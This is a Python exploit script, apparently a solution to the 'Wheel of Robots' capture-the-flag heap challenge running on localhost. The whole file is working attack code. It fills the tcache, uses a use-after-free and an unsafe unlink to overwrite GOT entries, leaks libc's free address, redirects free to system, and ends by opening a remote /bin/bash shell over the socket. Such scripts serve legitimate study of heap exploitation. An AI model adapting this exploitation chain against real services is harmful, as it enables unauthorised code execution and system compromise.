import socket
import sys
from time import sleep
from roputils import Platform, ROP_util

from utils import from_bytes, remote_shell, to_bytes, _is_int
from logger import Logger

logger = Logger("WHEEL_OF_ROBOTS")

SERVER_ADDR = ('localhost', 8889)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(SERVER_ADDR)

RECV_DELAY = 0.2

ALLOC = b'1\n'
FREE = b'2\n'
FILL = b'3\n'
START = b'4\n'

TINY = b'1\n'           # alloc 0x14
BENDER = b'2\n'         # alloc 20 * i (i <= 4, default 2)
ROBOTDEVIL = b'3\n'     # alloc 20 * i (i <= 0x63, default 0x14)
CHAINSMOKER = b'4\n'    # alloc 0x0FA0 
BILBOT = b'5\n'         # alloc 0x9C40
DESTRUCTOR = b'6\n'     # alloc 20 * i (arbitrary i)

def allocate_request(name, factor=None):

    sock.recv(1024)
    sock.send(name)

    sleep(RECV_DELAY)
    sock.recv(1024)

    if name in [TINY, CHAINSMOKER, BILBOT]:
        return None

    sock.send(f"{_is_int(factor)}\n".encode())

    sleep(RECV_DELAY)
    sock.recv(1024)

    return None

def fill_request(name, content):

    if type(content) == str:
        content = content.encode()

    sock.recv(1024)
    sock.send(name)

    sleep(RECV_DELAY)
    sock.recv(1024)

    sock.send(content)

    sleep(RECV_DELAY)
    sock.recv(1024)

    return None

def free_request(name):

    sock.recv(1024)
    sock.send(name)

    sleep(RECV_DELAY)
    sock.recv(1024)

    return None

def start_request():

    sleep(2)
    res = sock.recv(1024 * 64)
    print(res, end='\n\n')

    pos = res.find(b"!! Thx ")

    if pos > -1 and res[pos + 7: pos + 7 + 6][-1] == 127:
        return res[pos + 7: pos + 7 + 6]
    return None

def command(opt):

    sock.send(opt[0])

    if opt[0] is ALLOC:
        
        ch = allocate_request(*opt[1:])
        logger.log_info(f"adding robot {opt[1]}")
        return ch

    elif opt[0] is FILL:
        logger.log_info(f"changing robot {opt[1]}")
        return fill_request(*opt[1:])

    elif opt[0] is FREE:
        logger.log_info(f"free robot {opt[1]}")
        return free_request(*opt[1:])

    elif opt[0] is START:
        logger.log_info(f"starting wheel")
        return start_request(*opt[1:])

def command_stream():

    # no PIE
    # main addr: 0x4017f2

    BENDER_PTR_ADDR = 0x6030f0
    GOT_PLT_FREE_ADDR = 0x603018
    GOT_PLT_EXIT_ADDR = 0x603098
    CHOOSE_OPT_ADDR = 0x40143c
    START_ADDR = 0x400940

    FREE_OFFSET = 0x9d850
    SYSTEM_OFFSET = 0x55410

    sock.recv(1024)

    libc_base = None

    # fill tcache
    for _ in range(7):
        command((ALLOC, BENDER, 4))
        command((FREE, BENDER))

    # getting UAF pointer
    command((ALLOC, BENDER, 4))
    command((FREE, BENDER))

    # overriding bender_selected_bool to true
    sock.send(ALLOC)
    sock.recv(1024)
    sock.send(b'\x00' * 4 + b'\xff')

    sleep(RECV_DELAY)
    sock.recv(1024)

    # trigger merging the free chunk with the top
    command((ALLOC, DESTRUCTOR, 0x50)) # 0x640 calloc arg
    command((FREE, DESTRUCTOR))

    # preparing the unsafe unlinking
    command((ALLOC, ROBOTDEVIL, 2)) # 0x28 calloc arg
    command((ALLOC, DESTRUCTOR, 0x40)) # 0x500 calloc arg
    
    #command((FILL, BENDER, b'\xff' * 80))
    command((FILL, BENDER, b'\x00' * 8 +                        # pad
                            to_bytes(0x21) +                    # size of fake chunk, with prev inuse set
                            to_bytes(BENDER_PTR_ADDR - 0x18) +  # fd of fake chunk
                            to_bytes(BENDER_PTR_ADDR - 0x10) +  # bk of fake chunk
                            to_bytes(0x20) +                    # prev size corresponding to fake chunk size
                            to_bytes(0x510) +                   # big chunk size, with prev inuse NOT set
                            b'\x00' * 8 * 4))                   # pad
    
    command((FREE, DESTRUCTOR))
    
    command((FILL, BENDER, b'\x00' * 8 +                        # pad
                            to_bytes(GOT_PLT_FREE_ADDR) +       # chainsmoker ptr
                            to_bytes(GOT_PLT_FREE_ADDR) +       # destructor ptr
                            to_bytes(BENDER_PTR_ADDR) +         # bender ptr
                            to_bytes(GOT_PLT_EXIT_ADDR) +       # tiny ptr
                            to_bytes(GOT_PLT_FREE_ADDR) +       # robotdevil ptr
                            b'\x00' * 8 +                       # bilbot ptr
                            b'\x00' * 4 +                       # option buffer
                            b'\xff' * 4 +                       # bender selected bool
                            b'\x00' * 4 +                       # chainsmoker selected bool
                            b'\x00' * 4 +                       # destructor selected bool
                            b'\xff' * 4 +                       # tiny selected bool
                            b'\xff' * 4))                       # robotdevil selected bool
    
    libc_base_leaked = False
    while libc_base_leaked is False:

        command((FILL, BENDER, to_bytes(BENDER_PTR_ADDR) +          # bender ptr
                                to_bytes(GOT_PLT_EXIT_ADDR) +       # tiny ptr
                                to_bytes(GOT_PLT_FREE_ADDR) +       # robotdevil ptr
                                to_bytes(GOT_PLT_FREE_ADDR) +       # bilbot ptr
                                b'\x00' * 4 +                       # option buffer
                                b'\xff' * 4 +                       # bender selected bool
                                b'\xff' * 4 +                       # chainsmoker selected bool
                                b'\xff' * 4 +                       # destructor selected bool
                                b'\xff' * 4 +                       # tiny selected bool
                                b'\xff' * 4 +                       # robotdevil selected bool
                                b'\xff' * 8 +                       # bilbot selected bool (and pad)
                                b'\xff' * 8 +                       # robot count
                                to_bytes(0x4)))                     # bender calloc factor

        command((FILL, TINY, to_bytes(START_ADDR)))
        free_addr = command((START,))

        print(f"----{free_addr}----")

        if free_addr is not None:

            free_addr = from_bytes(free_addr)
            print(f"leaked free addr: {hex(free_addr)}")

            libc_base = free_addr - FREE_OFFSET
            libc_base_leaked = True

    system_addr = libc_base + SYSTEM_OFFSET
    command((FILL, CHAINSMOKER, to_bytes(system_addr)))

    command((FILL, BENDER, to_bytes(BENDER_PTR_ADDR) +              # bender ptr
                                to_bytes(GOT_PLT_FREE_ADDR) +       # tiny ptr
                                to_bytes(GOT_PLT_FREE_ADDR) +       # robotdevil ptr
                                to_bytes(GOT_PLT_FREE_ADDR) +       # bilbot ptr
                                b'\x00' * 4 +                       # option buffer
                                b'\xff' * 4 +                       # bender selected bool
                                b'\xff' * 4 +                       # chainsmoker selected bool
                                b'\xff' * 4 +                       # destructor selected bool
                                b'\x00' * 4 +                       # tiny selected bool
                                b'\xff' * 4 +                       # robotdevil selected bool
                                b'\xff' * 8 +                       # bilbot selected bool (and pad)
                                b'\x00' * 8 +                       # robot count
                                to_bytes(0x4)))                     # bender calloc factor

    command((ALLOC, TINY))
    command((FILL, TINY, b'/bin/bash\n'))
    
    # executing remote system call
    sock.send(FREE)

    sock.recv(1024)
    sock.send(TINY)

    sleep(RECV_DELAY)

    remote_shell(sock)

if __name__ == "__main__":
    command_stream()